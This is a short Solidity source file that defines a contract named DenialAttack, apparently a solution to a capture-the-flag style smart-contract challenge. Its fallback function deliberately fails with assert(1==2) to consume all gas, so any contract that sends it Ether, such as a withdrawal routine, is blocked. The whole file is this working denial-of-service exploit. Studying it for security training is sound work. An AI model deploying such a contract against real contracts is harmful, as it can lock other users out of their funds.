pragma solidity ^0.6.0;

contract DenialAttack {

  function () external payable {
      // consume all the gas
      assert(1==2);
  }

}
